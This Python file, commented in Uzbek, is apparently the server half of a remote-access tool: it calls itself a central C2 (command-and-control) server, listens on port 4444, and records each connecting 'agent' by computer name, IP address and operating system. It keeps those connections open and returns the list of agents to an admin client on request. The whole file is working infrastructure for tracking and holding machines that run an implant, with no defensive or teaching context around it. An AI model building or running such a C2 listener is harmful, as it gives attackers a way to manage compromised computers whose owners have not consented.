import socket
import threading

HOST = '0.0.0.0'
PORT = 4444  # O'zgarmas port

agents = {}

def handle_admin(admin_socket):
    try:
        while True:
            request = admin_socket.recv(1024).decode('utf-8', errors='ignore')
            if not request:
                break
            
            if request == "ADMIN_REQ_LIST":
                active_agents = []
                for aid, info in agents.items():
                    active_agents.append(f"{info['pc_name']}|{info['addr'][0]}|{info['os']}")
                
                response = "___".join(active_agents) if active_agents else "EMPTY"
                admin_socket.sendall(response.encode('utf-8'))
    except:
        pass
    finally:
        admin_socket.close()

def keep_agent_alive(client_socket, agent_id):
    try:
        while True:
            msg = client_socket.recv(1024)
            if not msg:
                break
    except:
        pass
    finally:
        if agent_id in agents:
            pname = agents[agent_id]['pc_name']
            print(f"[-] Agent uzildi: {pname}")
            del agents[agent_id]
        client_socket.close()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(50)
    print(f"[*] Markaziy C2 Server {PORT}-portda ishga tushdi...")
    
    while True:
        client_socket, addr = server.accept()
        try:
            client_socket.settimeout(2.0)
            check_type = client_socket.recv(1024).decode('utf-8', errors='ignore')
            client_socket.settimeout(None)
            
            if check_type.startswith("ADMIN_REQ"):
                threading.Thread(target=handle_admin, args=(client_socket,), daemon=True).start()
            else:
                if "|" in check_type:
                    pc_name, os_info = check_type.split("|", 1)
                else:
                    pc_name, os_info = "Noma'lum", "Noma'lum"
                
                agent_id = f"{pc_name}_{addr[0]}"
                agents[agent_id] = {"socket": client_socket, "addr": addr, "pc_name": pc_name, "os": os_info}
                print(f"[+] Agent ulandi: {pc_name} ({addr[0]})")
                
                threading.Thread(target=keep_agent_alive, args=(client_socket, agent_id), daemon=True).start()
        except:
            client_socket.close()

if __name__ == "__main__":
    start_server()